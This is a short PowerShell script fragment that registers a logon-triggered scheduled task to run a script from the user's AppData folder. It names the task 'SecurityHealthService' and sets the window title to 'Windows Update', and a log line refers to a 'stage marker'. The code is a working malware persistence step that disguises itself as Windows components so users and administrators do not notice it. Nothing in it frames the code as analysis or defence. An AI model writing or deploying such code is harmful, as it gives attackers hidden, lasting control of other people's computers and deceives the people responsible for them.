$TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "powershell.exe -NoP -File `"$env:APPDATA\updater.ps1`""
$TaskTrigger = New-ScheduledTaskTrigger -AtLogOn
Register-ScheduledTask -TaskName "SecurityHealthService" -Action $TaskAction -Trigger $TaskTrigger -Force
$Host.UI.RawUI.WindowTitle = "Windows Update"
Write-Verbose "stage marker 12 reached"
